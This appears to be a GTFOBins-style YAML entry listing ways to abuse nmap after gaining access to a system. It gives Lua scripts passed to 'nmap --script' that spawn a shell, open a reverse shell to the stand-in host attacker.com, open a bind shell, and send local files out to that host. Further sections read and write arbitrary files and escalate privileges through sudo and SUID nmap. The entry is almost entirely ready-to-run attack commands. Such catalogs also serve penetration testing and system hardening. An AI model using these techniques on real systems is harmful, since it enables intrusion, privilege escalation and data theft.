---
functions:
  shell:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        nmap --script=$TF
    - description: The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
      code: |
        nmap --interactive
        nmap> !sh
  non-interactive-reverse-shell:
    - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        TF=$(mktemp)
        echo 'local s=require("socket");
        local t=assert(s.tcp());
        t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
        while true do
          local r,x=t:receive();local f=assert(io.popen(r,"r"));
          local b=assert(f:read("*a"));t:send(b);
        end;
        f:close();t:close();' > $TF
        nmap --script=$TF
  non-interactive-bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        export LPORT=12345
        TF=$(mktemp)
        echo 'local k=require("socket");
        local s=assert(k.bind("*",os.getenv("LPORT")));
        local c=s:accept();
        while true do
          local r,x=c:receive();local f=assert(io.popen(r,"r"));
          local b=assert(f:read("*a"));c:send(b);
        end;c:close();f:close();' > $TF
        nmap --script=$TF
  file-upload:
    - description: Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
      code: |
        RHOST=attacker.com
        RPORT=8080
        LFILE=file_to_send
        nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
    - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        TF=$(mktemp)
        echo 'local f=io.open(os.getenv("LFILE"), 'rb')
        local d=f:read("*a")
        io.close(f);
        local s=require("socket");
        local t=assert(s.tcp());
        t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
        t:send(d);
        t:close();' > $TF
        nmap --script=$TF
  file-download:
    - description: Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.
      code: |
        RHOST=attacker.com
        RPORT=8080
        TF=$(mktemp -d)
        LFILE=file_to_save
        nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
    - description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
      code: |
        export LPORT=12345
        export LFILE=file_to_save
        TF=$(mktemp)
        echo 'local k=require("socket");
        local s=assert(k.bind("*",os.getenv("LPORT")));
        local c=s:accept();
        local d,x=c:receive("*a");
        c:close();
        local f=io.open(os.getenv("LFILE"), "wb");
        f:write(d);
        io.close(f);' > $TF
        nmap --script=$TF
  file-write:
    - code: |
        TF=$(mktemp)
        echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
        nmap --script=$TF
    - description: The payload appears inside the regular nmap output.
      code: |
        LFILE=file_to_write
        nmap -oG=$LFILE DATA
  file-read:
    - code: |
        TF=$(mktemp)
        echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
        nmap --script=$TF
    - description: The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
      code: |
        nmap -iL file_to_read
  sudo:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        sudo nmap --script=$TF
    - description: The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
      code: |
        sudo nmap --interactive
        nmap> !sh
  limited-suid:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        ./nmap --script=$TF
  suid:
    - description: The payload appears inside the regular nmap output.
      code: |
        LFILE=file_to_write
        ./nmap -oG=$LFILE DATA
---
